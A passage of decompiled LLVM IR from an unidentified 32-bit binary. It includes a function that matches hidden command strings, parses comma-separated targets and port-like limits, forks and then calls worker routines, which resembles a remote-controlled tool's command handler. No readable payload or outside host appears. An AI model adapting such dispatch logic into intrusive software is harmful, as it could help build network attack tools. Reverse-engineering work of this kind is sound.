  br i1 %v7_e2a0, label %dec_label_pc_e2c0, label %dec_label_pc_e2a8

dec_label_pc_e2a8:                                ; preds = %dec_label_pc_e208, %dec_label_pc_e294
  store i32 %v3_e138, i32* %r2.global-to-local, align 4
  %v7_e2b0 = load i32, i32* %v6_e230, align 4
  %v1_e2b8 = call i32 @function_10678(i32 %v7_e2b0)
  br label %dec_label_pc_e5e0

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_e294
  store i32 %v2_e1d4, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_e1d8, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e2f8.lr.ph:                          ; preds = %dec_label_pc_e1c0
  br label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2f8.lr.ph, %dec_label_pc_e2f8
  %storemerge513 = phi i32 [ 0, %dec_label_pc_e2f8.lr.ph ], [ %v1_e30c, %dec_label_pc_e2f8 ]
  store i32 %v2_e2e4, i32* %r2.global-to-local, align 4
  %v5_e304 = mul nuw nsw i32 %storemerge513, 4
  %v6_e304 = add i32 %v5_e304, %v2_e2e4
  %v7_e304 = inttoptr i32 %v6_e304 to i32*
  store i32 0, i32* %v7_e304, align 4
  %v1_e30c = add nuw nsw i32 %storemerge513, 1
  %tmp50 = icmp ult i32 %v1_e30c, 32
  br i1 %tmp50, label %dec_label_pc_e2f8, label %dec_label_pc_e320

dec_label_pc_e320:                                ; preds = %dec_label_pc_e2f8
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_e328 = add i32 %v3_e1cc, %v3_e138
  %v6_e328 = inttoptr i32 %v5_e328 to i32*
  %v7_e328 = load i32, i32* %v6_e328, align 4
  %v3_e32c = udiv i32 %v7_e328, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_e338 = mul nuw nsw i32 %v3_e32c, 4
  %v2_e344 = add i32 %v2_e340, %v3_e338
  %v1_e348 = inttoptr i32 %v2_e344 to i32*
  %v2_e348 = load i32, i32* %v1_e348, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e354 = load i32, i32* %v6_e328, align 4
  %v1_e358 = urem i32 %v7_e354, 32
  %v6_e360 = shl i32 1, %v1_e358
  %v2_e364 = or i32 %v6_e360, %v2_e348
  store i32 %v2_e364, i32* %v1_e348, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e39c = load i32, i32* %v6_e328, align 4
  %v1_e3a0 = add i32 %v7_e39c, 1
  store i32 %v1_e3a0, i32* %r2.global-to-local, align 4
  %v1_e3ac = load i32, i32* @sp, align 4
  %v2_e3ac = inttoptr i32 %v1_e3ac to i32*
  store i32 %v2_e3a8, i32* %v2_e3ac, align 4
  %v0_e3b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e2e4, i32* %r2.global-to-local, align 4
  %v4_e3c0 = load i32, i32* %stack_var_-212, align 4
  %v5_e3c0 = call i32 @function_108bc(i32 %v0_e3b0, i32 0, i32 %v2_e2e4, i32 0, i32 %v4_e3c0)
  %v7_e3d0 = icmp eq i32 %v5_e3c0, 1
  br i1 %v7_e3d0, label %dec_label_pc_e3d8, label %dec_label_pc_e474

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e320
  store i32 4, i32* %stack_var_-216, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e3e8 = load i32, i32* %v6_e328, align 4
  store i32 %v7_e3e8, i32* %r2.global-to-local, align 4
  %v1_e3f4 = load i32, i32* @sp, align 4
  %v2_e3f4 = inttoptr i32 %v1_e3f4 to i32*
  store i32 %v2_e3f0, i32* %v2_e3f4, align 4
  %v0_e3f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e408 = load i32, i32* %stack_var_-216, align 4
  %v6_e408 = call i32 @function_12550(i32 %v0_e3f8, i32 1, i32 4, i32* nonnull %stack_var_-220, i32 %v4_e408)
  %v3_e40c = load i32, i32* %stack_var_-220, align 4
  %v2_e410 = icmp eq i32 %v3_e40c, 0
  br i1 %v2_e410, label %dec_label_pc_e450, label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e3d8
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e420 = load i32, i32* %v6_e328, align 4
  %v1_e428 = call i32 @function_10678(i32 %v7_e420)
  store i32 %v2_e1d4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e1d8, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e450:                                ; preds = %dec_label_pc_e3d8
  store i32 %v2_e1d4, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_e1d8, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e474:                                ; preds = %dec_label_pc_e320
  %v3_e478 = icmp eq i32 %v5_e3c0, -1
  br i1 %v3_e478, label %dec_label_pc_e480, label %dec_label_pc_e5e0

dec_label_pc_e480:                                ; preds = %dec_label_pc_e474
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e488 = load i32, i32* %v6_e328, align 4
  %v1_e490 = call i32 @function_10678(i32 %v7_e488)
  store i32 %v2_e1d4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e1d8, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e4cc.lr.ph:                          ; preds = %dec_label_pc_e1ec
  br label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4cc.lr.ph, %dec_label_pc_e4cc
  %storemerge49 = phi i32 [ 0, %dec_label_pc_e4cc.lr.ph ], [ %v1_e4e0, %dec_label_pc_e4cc ]
  store i32 %v2_e2e4, i32* %r2.global-to-local, align 4
  %v5_e4d8 = mul nuw nsw i32 %storemerge49, 4
  %v6_e4d8 = add i32 %v5_e4d8, %v2_e2e4
  %v7_e4d8 = inttoptr i32 %v6_e4d8 to i32*
  store i32 0, i32* %v7_e4d8, align 4
  %v1_e4e0 = add nuw nsw i32 %storemerge49, 1
  %tmp51 = icmp ult i32 %v1_e4e0, 32
  br i1 %tmp51, label %dec_label_pc_e4cc, label %dec_label_pc_e4f4

dec_label_pc_e4f4:                                ; preds = %dec_label_pc_e4cc
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_e4fc = add i32 %v3_e1cc, %v3_e138
  %v6_e4fc = inttoptr i32 %v5_e4fc to i32*
  %v7_e4fc = load i32, i32* %v6_e4fc, align 4
  %v3_e500 = udiv i32 %v7_e4fc, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_e50c = mul nuw nsw i32 %v3_e500, 4
  %v2_e518 = add i32 %v2_e340, %v3_e50c
  %v1_e51c = inttoptr i32 %v2_e518 to i32*
  %v2_e51c = load i32, i32* %v1_e51c, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e528 = load i32, i32* %v6_e4fc, align 4
  %v1_e52c = urem i32 %v7_e528, 32
  %v6_e534 = shl i32 1, %v1_e52c
  %v2_e538 = or i32 %v6_e534, %v2_e51c
  store i32 %v2_e538, i32* %v1_e51c, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e570 = load i32, i32* %v6_e4fc, align 4
  %v1_e574 = add i32 %v7_e570, 1
  store i32 %v1_e574, i32* %r2.global-to-local, align 4
  %v1_e580 = load i32, i32* @sp, align 4
  %v2_e580 = inttoptr i32 %v1_e580 to i32*
  store i32 %v2_e3a8, i32* %v2_e580, align 4
  %v0_e584 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_e594 = load i32, i32* %stack_var_-212, align 4
  %v5_e594 = call i32 @function_108bc(i32 %v0_e584, i32 0, i32 0, i32 %v2_e2e4, i32 %v4_e594)
  %v2_e5a4 = icmp eq i32 %v5_e594, 0
  br i1 %v2_e5a4, label %dec_label_pc_e5e0, label %dec_label_pc_e5ac

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e4f4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e5b4 = load i32, i32* %v6_e4fc, align 4
  %v1_e5bc = call i32 @function_10678(i32 %v7_e5b4)
  store i32 %v2_e1d4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e1d8, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e5e0:                                ; preds = %dec_label_pc_e1f8, %dec_label_pc_e474, %dec_label_pc_e4f4, %dec_label_pc_e480, %dec_label_pc_e450, %dec_label_pc_e418, %dec_label_pc_e2c0, %dec_label_pc_e2a8, %dec_label_pc_e5ac
  %v1_e5e4 = add nuw nsw i32 %storemerge360, 1
  store i32 %v1_e5e4, i32* %r2.global-to-local, align 4
  %v5_e5f8 = icmp slt i32 %v1_e5e4, %v3_e094
  br i1 %v5_e5f8, label %dec_label_pc_e1c0, label %dec_label_pc_e5fc

dec_label_pc_e5fc:                                ; preds = %dec_label_pc_e5ec.preheader, %dec_label_pc_e5e0, %dec_label_pc_e0f4
  %v2_e600 = call i32 @function_1096c(i32* null)
  store i32 %v2_e600, i32* %r2.global-to-local, align 4
  %v5_e610 = icmp slt i32 %v2_e600, %v2_e1a8
  br i1 %v5_e610, label %dec_label_pc_e5ec.preheader, label %dec_label_pc_e614

dec_label_pc_e5ec.preheader:                      ; preds = %dec_label_pc_e5fc
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_e5f457, label %dec_label_pc_e1c0, label %dec_label_pc_e5fc

dec_label_pc_e614:                                ; preds = %dec_label_pc_e5fc, %dec_label_pc_e060
  %v12_e61c = phi i32 [ %v3_e0e0, %dec_label_pc_e060 ], [ %v2_e600, %dec_label_pc_e5fc ]
  %v2_e61c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e61c, i32* @r4, align 4
  store i32 %v6_e064, i32* @fp, align 4
  ret i32 %v12_e61c

; uselistorder directives
  uselistorder i32 %v1_e5e4, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_e1d8, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_e1d4, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_e1cc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge360, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 14, 13, 12, 11, 15 }
  uselistorder i32 %v2_e2e4, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_e138, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_e094, { 1, 2, 0 }
  uselistorder i32 %v0_e084, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-212, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-220, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 8, 40, 39, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 6, 7, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_12550, { 3, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_108bc, { 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 ()* @function_106fc, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e5e0, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_e4cc, { 1, 0 }
  uselistorder label %dec_label_pc_e2f8, { 1, 0 }
  uselistorder label %dec_label_pc_e2a8, { 1, 0 }
}

define i32 @function_e620(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_e620:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_e624 = load i32, i32* @r4, align 4
  %v6_e624 = load i32, i32* @fp, align 4
  store i32 58924, i32* %stack_var_-4, align 4
  %v2_e628 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e628, i32* @fp, align 4
  %v2_e63c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16d40.65 to i32), i32* @r1, align 4
  %v3_e648 = inttoptr i32 %v2_e63c to i8*
  %v4_e648 = call i32 @function_11e10(i8* %v3_e648, i32 ptrtoint ([5 x i8]* @global_var_16d40.65 to i32))
  %v2_e650 = icmp eq i32 %v4_e648, 0
  br i1 %v2_e650, label %dec_label_pc_e658, label %dec_label_pc_e670

dec_label_pc_e658:                                ; preds = %dec_label_pc_e620
  %v2_e65c = load i32, i32* @global_var_205d0.63, align 4
  %v3_e668 = call i32 @function_8eb4(i32 %v2_e65c, i32 ptrtoint ([6 x i8]* @global_var_16db0.131 to i32))
  br label %dec_label_pc_f0c4

dec_label_pc_e670:                                ; preds = %dec_label_pc_e620
  %v2_e674 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_16db8.133 to i32), i32* @r1, align 4
  %v3_e680 = inttoptr i32 %v2_e674 to i8*
  %v4_e680 = call i32 @function_11e10(i8* %v3_e680, i32 ptrtoint ([11 x i8]* @global_var_16db8.133 to i32))
  %v2_e688 = icmp eq i32 %v4_e680, 0
  br i1 %v2_e688, label %dec_label_pc_e690, label %dec_label_pc_e6bc

dec_label_pc_e690:                                ; preds = %dec_label_pc_e670
  %v2_e694 = load i32, i32* @global_var_205d0.63, align 4
  store i32 %v2_e694, i32* @r4, align 4
  %v2_e69c = load i32, i32* @global_var_2664c.76, align 4
  store i32 %v2_e69c, i32* @r0, align 4
  %v1_e6a0 = inttoptr i32 %v2_e69c to i32*
  %v2_e6a0 = call i32 @function_124c8(i32* %v1_e6a0)
  %v0_e6a8 = load i32, i32* @r4, align 4
  store i32 %v2_e6a0, i32* @r2, align 4
  %v3_e6b4 = call i32 @function_8eb4(i32 %v0_e6a8, i32 ptrtoint ([10 x i8]* @global_var_16dc4.136 to i32))
  br label %dec_label_pc_f0c4

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e670
  %v2_e6c0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16dd0.138 to i32), i32* @r1, align 4
  %v3_e6cc = inttoptr i32 %v2_e6c0 to i8*
  %v4_e6cc = call i32 @function_11e10(i8* %v3_e6cc, i32 ptrtoint ([5 x i8]* @global_var_16dd0.138 to i32))
  %v2_e6d4 = icmp eq i32 %v4_e6cc, 0
  br i1 %v2_e6d4, label %dec_label_pc_e6dc, label %dec_label_pc_e840

dec_label_pc_e6dc:                                ; preds = %dec_label_pc_e6bc
  %v7_e6e4 = icmp slt i32 %arg1, 4
  br i1 %v7_e6e4, label %dec_label_pc_f0c4, label %dec_label_pc_e6e8

dec_label_pc_e6e8:                                ; preds = %dec_label_pc_e6dc
  %v1_e6ec = add i32 %tmp, 8
  %v1_e6f0 = inttoptr i32 %v1_e6ec to i32*
  %v2_e6f0 = load i32, i32* %v1_e6f0, align 4
  %v1_e6f8 = inttoptr i32 %v2_e6f0 to i8*
  %v2_e6f8 = call i32 @function_13220(i8* %v1_e6f8)
  %tmp83 = icmp slt i32 %v2_e6f8, 1
  br i1 %tmp83, label %dec_label_pc_f0c4, label %dec_label_pc_e708

dec_label_pc_e708:                                ; preds = %dec_label_pc_e6e8
  %v1_e70c = add i32 %tmp, 12
  %v1_e710 = inttoptr i32 %v1_e70c to i32*
  %v2_e710 = load i32, i32* %v1_e710, align 4
  %v1_e718 = inttoptr i32 %v2_e710 to i8*
  %v2_e718 = call i32 @function_13220(i8* %v1_e718)
  %v5_e724 = icmp sgt i32 %v2_e718, 0
  br i1 %v5_e724, label %dec_label_pc_e72c, label %dec_label_pc_f0c4

dec_label_pc_e72c:                                ; preds = %dec_label_pc_e708
  %v1_e730 = add i32 %tmp, 4
  %v1_e734 = inttoptr i32 %v1_e730 to i32*
  %v2_e734 = load i32, i32* %v1_e734, align 4
  %v2_e744 = load i32, i32* %v1_e6f0, align 4
  %v1_e74c = inttoptr i32 %v2_e744 to i8*
  %v2_e74c = call i32 @function_13220(i8* %v1_e74c)
  %v2_e760 = load i32, i32* %v1_e710, align 4
  %v1_e768 = inttoptr i32 %v2_e760 to i8*
  %v2_e768 = call i32 @function_13220(i8* %v1_e768)
  %v2_e780 = call i32 @function_11e90(i32 %v2_e734, i32 44)
  %v2_e788 = icmp eq i32 %v2_e780, 0
  br i1 %v2_e788, label %dec_label_pc_e808, label %dec_label_pc_e790

dec_label_pc_e790:                                ; preds = %dec_label_pc_e72c
  store i32 %v2_e734, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_e79c = call i32 @function_12340(i32 %v2_e734, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_e7fc31 = icmp eq i32 %v2_e79c, 0
  br i1 %v2_e7fc31, label %dec_label_pc_e840, label %dec_label_pc_e7ac

dec_label_pc_e7ac:                                ; preds = %dec_label_pc_e790, %dec_label_pc_e7e4
  %storemerge1632 = phi i32 [ %v2_e7ec, %dec_label_pc_e7e4 ], [ %v2_e79c, %dec_label_pc_e790 ]
  %v0_e7ac = call i32 @function_a058()
  %v2_e7b4 = icmp eq i32 %v0_e7ac, 0
  br i1 %v2_e7b4, label %dec_label_pc_e7bc, label %dec_label_pc_e7e4

dec_label_pc_e7bc:                                ; preds = %dec_label_pc_e7ac
  %v4_e7c8 = call i32 @function_e060(i32 %storemerge1632, i32 %v2_e74c, i32 %v2_e768, i32 0)
  %v2_e7d0 = load i32, i32* @global_var_205d0.63, align 4
  %v1_e7d8 = call i32 @function_10678(i32 %v2_e7d0)
  %v1_e7e0 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_e7e4:                                ; preds = %dec_label_pc_e7ac
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_e7ec = call i32 @function_12340(i32 0, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_e7fc = icmp eq i32 %v2_e7ec, 0
  br i1 %v2_e7fc, label %dec_label_pc_e840, label %dec_label_pc_e7ac

dec_label_pc_e808:                                ; preds = %dec_label_pc_e72c
  %v0_e808 = call i32 @function_a058()
  %v2_e810 = icmp eq i32 %v0_e808, 0
  br i1 %v2_e810, label %dec_label_pc_e818, label %dec_label_pc_f0c4

dec_label_pc_e818:                                ; preds = %dec_label_pc_e808
  %v4_e824 = call i32 @function_e060(i32 %v2_e734, i32 %v2_e74c, i32 %v2_e768, i32 0)
  %v2_e82c = load i32, i32* @global_var_205d0.63, align 4
  %v1_e834 = call i32 @function_10678(i32 %v2_e82c)
  %v1_e83c = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_e840:                                ; preds = %dec_label_pc_e7e4, %dec_label_pc_e790, %dec_label_pc_e6bc
  %v2_e844 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16dd8.141 to i32), i32* @r1, align 4
  %v3_e850 = inttoptr i32 %v2_e844 to i8*
  %v4_e850 = call i32 @function_11e10(i8* %v3_e850, i32 ptrtoint ([5 x i8]* @global_var_16dd8.141 to i32))
  %v2_e858 = icmp eq i32 %v4_e850, 0
  br i1 %v2_e858, label %dec_label_pc_e860, label %dec_label_pc_e9c4

dec_label_pc_e860:                                ; preds = %dec_label_pc_e840
  %v7_e868 = icmp slt i32 %arg1, 4
  br i1 %v7_e868, label %dec_label_pc_f0c4, label %dec_label_pc_e86c

dec_label_pc_e86c:                                ; preds = %dec_label_pc_e860
  %v1_e870 = add i32 %tmp, 8
  %v1_e874 = inttoptr i32 %v1_e870 to i32*
  %v2_e874 = load i32, i32* %v1_e874, align 4
  %v1_e87c = inttoptr i32 %v2_e874 to i8*
  %v2_e87c = call i32 @function_13220(i8* %v1_e87c)
  %tmp84 = icmp slt i32 %v2_e87c, 1
  br i1 %tmp84, label %dec_label_pc_f0c4, label %dec_label_pc_e88c

dec_label_pc_e88c:                                ; preds = %dec_label_pc_e86c
  %v1_e890 = add i32 %tmp, 12
  %v1_e894 = inttoptr i32 %v1_e890 to i32*
  %v2_e894 = load i32, i32* %v1_e894, align 4
  %v1_e89c = inttoptr i32 %v2_e894 to i8*
  %v2_e89c = call i32 @function_13220(i8* %v1_e89c)
  %v5_e8a8 = icmp sgt i32 %v2_e89c, 0
  br i1 %v5_e8a8, label %dec_label_pc_e8b0, label %dec_label_pc_f0c4

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e88c
  %v1_e8b4 = add i32 %tmp, 4
  %v1_e8b8 = inttoptr i32 %v1_e8b4 to i32*
  %v2_e8b8 = load i32, i32* %v1_e8b8, align 4
  %v2_e8c8 = load i32, i32* %v1_e874, align 4
  %v1_e8d0 = inttoptr i32 %v2_e8c8 to i8*
  %v2_e8d0 = call i32 @function_13220(i8* %v1_e8d0)
  %v2_e8e4 = load i32, i32* %v1_e894, align 4
  %v1_e8ec = inttoptr i32 %v2_e8e4 to i8*
  %v2_e8ec = call i32 @function_13220(i8* %v1_e8ec)
  %v2_e904 = call i32 @function_11e90(i32 %v2_e8b8, i32 44)
  %v2_e90c = icmp eq i32 %v2_e904, 0
  br i1 %v2_e90c, label %dec_label_pc_e98c, label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %dec_label_pc_e8b0
  store i32 %v2_e8b8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_e920 = call i32 @function_12340(i32 %v2_e8b8, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_e98028 = icmp eq i32 %v2_e920, 0
  br i1 %v2_e98028, label %dec_label_pc_e9c4, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e914, %dec_label_pc_e968
  %storemerge1429 = phi i32 [ %v2_e970, %dec_label_pc_e968 ], [ %v2_e920, %dec_label_pc_e914 ]
  %v0_e930 = call i32 @function_a058()
  %v2_e938 = icmp eq i32 %v0_e930, 0
  br i1 %v2_e938, label %dec_label_pc_e940, label %dec_label_pc_e968

dec_label_pc_e940:                                ; preds = %dec_label_pc_e930
  %v4_e94c = call i32 @function_db48(i32 %storemerge1429, i32 %v2_e8d0, i32 %v2_e8ec, i32 0)
  %v2_e954 = load i32, i32* @global_var_205d0.63, align 4
  %v1_e95c = call i32 @function_10678(i32 %v2_e954)
  %v1_e964 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_e968:                                ; preds = %dec_label_pc_e930
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_e970 = call i32 @function_12340(i32 0, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_e980 = icmp eq i32 %v2_e970, 0
  br i1 %v2_e980, label %dec_label_pc_e9c4, label %dec_label_pc_e930

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e8b0
  %v0_e98c = call i32 @function_a058()
  %v2_e994 = icmp eq i32 %v0_e98c, 0
  br i1 %v2_e994, label %dec_label_pc_e99c, label %dec_label_pc_f0c4

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e98c
  %v4_e9a8 = call i32 @function_db48(i32 %v2_e8b8, i32 %v2_e8d0, i32 %v2_e8ec, i32 0)
  %v2_e9b0 = load i32, i32* @global_var_205d0.63, align 4
  %v1_e9b8 = call i32 @function_10678(i32 %v2_e9b0)
  %v1_e9c0 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_e9c4:                                ; preds = %dec_label_pc_e968, %dec_label_pc_e914, %dec_label_pc_e840
  %v2_e9c8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16de0.143 to i32), i32* @r1, align 4
  %v3_e9d4 = inttoptr i32 %v2_e9c8 to i8*
  %v4_e9d4 = call i32 @function_11e10(i8* %v3_e9d4, i32 ptrtoint ([4 x i8]* @global_var_16de0.143 to i32))
  %v2_e9dc = icmp eq i32 %v4_e9d4, 0
  br i1 %v2_e9dc, label %dec_label_pc_e9e4, label %dec_label_pc_ec94

dec_label_pc_e9e4:                                ; preds = %dec_label_pc_e9c4
  %v7_e9ec = icmp slt i32 %arg1, 6
  br i1 %v7_e9ec, label %dec_label_pc_f0c4, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9e4
  %v1_e9f4 = add i32 %tmp, 12
  %v1_e9f8 = inttoptr i32 %v1_e9f4 to i32*
  %v2_e9f8 = load i32, i32* %v1_e9f8, align 4
  %v1_ea00 = inttoptr i32 %v2_e9f8 to i8*
  %v2_ea00 = call i32 @function_13220(i8* %v1_ea00)
  %v7_ea08 = icmp eq i32 %v2_ea00, -1
  br i1 %v7_ea08, label %dec_label_pc_f0c4, label %dec_label_pc_ea10

dec_label_pc_ea10:                                ; preds = %dec_label_pc_e9f0
  %v1_ea14 = add i32 %tmp, 8
  %v1_ea18 = inttoptr i32 %v1_ea14 to i32*
  %v2_ea18 = load i32, i32* %v1_ea18, align 4
  %v1_ea20 = inttoptr i32 %v2_ea18 to i8*
  %v2_ea20 = call i32 @function_13220(i8* %v1_ea20)
  %v7_ea28 = icmp eq i32 %v2_ea20, -1
  br i1 %v7_ea28, label %dec_label_pc_f0c4, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_ea10
  %v1_ea34 = add i32 %tmp, 16
  %v1_ea38 = inttoptr i32 %v1_ea34 to i32*
  %v2_ea38 = load i32, i32* %v1_ea38, align 4
  %v1_ea40 = inttoptr i32 %v2_ea38 to i8*
  %v2_ea40 = call i32 @function_13220(i8* %v1_ea40)
  %v7_ea48 = icmp eq i32 %v2_ea40, -1
  br i1 %v7_ea48, label %dec_label_pc_f0c4, label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %dec_label_pc_ea30
  %v1_ea54 = add i32 %tmp, 20
  %v1_ea58 = inttoptr i32 %v1_ea54 to i32*
  %v2_ea58 = load i32, i32* %v1_ea58, align 4
  %v1_ea60 = inttoptr i32 %v2_ea58 to i8*
  %v2_ea60 = call i32 @function_13220(i8* %v1_ea60)
  %v7_ea68 = icmp eq i32 %v2_ea60, -1
  br i1 %v7_ea68, label %dec_label_pc_f0c4, label %dec_label_pc_ea70

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea50
  %v2_ea78 = load i32, i32* %v1_ea58, align 4
  %v1_ea80 = inttoptr i32 %v2_ea78 to i8*
  %v2_ea80 = call i32 @function_13220(i8* %v1_ea80)
  %v8_ea94 = icmp sgt i32 %v2_ea80, 65500
  br i1 %v8_ea94, label %dec_label_pc_f0c4, label %dec_label_pc_ea98

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea70
  %v2_eaa0 = load i32, i32* %v1_ea38, align 4
  %v1_eaa8 = inttoptr i32 %v2_eaa0 to i8*
  %v2_eaa8 = call i32 @function_13220(i8* %v1_eaa8)
  %v8_eab4 = icmp sgt i32 %v2_eaa8, 32
  br i1 %v8_eab4, label %dec_label_pc_f0c4, label %dec_label_pc_eab8

dec_label_pc_eab8:                                ; preds = %dec_label_pc_ea98
  %v7_eabc = icmp eq i32 %arg1, 7
  br i1 %v7_eabc, label %dec_label_pc_eac4, label %dec_label_pc_eae8

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eab8
  %v1_eac8 = add i32 %tmp, 24
  %v1_eacc = inttoptr i32 %v1_eac8 to i32*
  %v2_eacc = load i32, i32* %v1_eacc, align 4
  %v1_ead4 = inttoptr i32 %v2_eacc to i8*
  %v2_ead4 = call i32 @function_13220(i8* %v1_ead4)
  %v5_eae0 = icmp sgt i32 %v2_ead4, 0
  br i1 %v5_eae0, label %dec_label_pc_eae8, label %dec_label_pc_f0c4

dec_label_pc_eae8:                                ; preds = %dec_label_pc_eab8, %dec_label_pc_eac4
  %v1_eaec = add i32 %tmp, 4
  %v1_eaf0 = inttoptr i32 %v1_eaec to i32*
  %v2_eaf0 = load i32, i32* %v1_eaf0, align 4
  %v2_eb00 = load i32, i32* %v1_ea18, align 4
  %v1_eb08 = inttoptr i32 %v2_eb00 to i8*
  %v2_eb08 = call i32 @function_13220(i8* %v1_eb08)
  %v2_eb1c = load i32, i32* %v1_e9f8, align 4
  %v1_eb24 = inttoptr i32 %v2_eb1c to i8*
  %v2_eb24 = call i32 @function_13220(i8* %v1_eb24)
  %v2_eb38 = load i32, i32* %v1_ea38, align 4
  %v1_eb40 = inttoptr i32 %v2_eb38 to i8*
  %v2_eb40 = call i32 @function_13220(i8* %v1_eb40)
  %v2_eb54 = load i32, i32* %v1_ea58, align 4
  %v1_eb5c = inttoptr i32 %v2_eb54 to i8*
  %v2_eb5c = call i32 @function_13220(i8* %v1_eb5c)
  br i1 %v7_eabc, label %dec_label_pc_eb74, label %dec_label_pc_eb90

dec_label_pc_eb74:                                ; preds = %dec_label_pc_eae8
  %v1_eb78 = add i32 %tmp, 24
  %v1_eb7c = inttoptr i32 %v1_eb78 to i32*
  %v2_eb7c = load i32, i32* %v1_eb7c, align 4
  %v1_eb84 = inttoptr i32 %v2_eb7c to i8*
  %v2_eb84 = call i32 @function_13220(i8* %v1_eb84)
  br label %dec_label_pc_eb98

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eae8
  br label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb74, %dec_label_pc_eb90
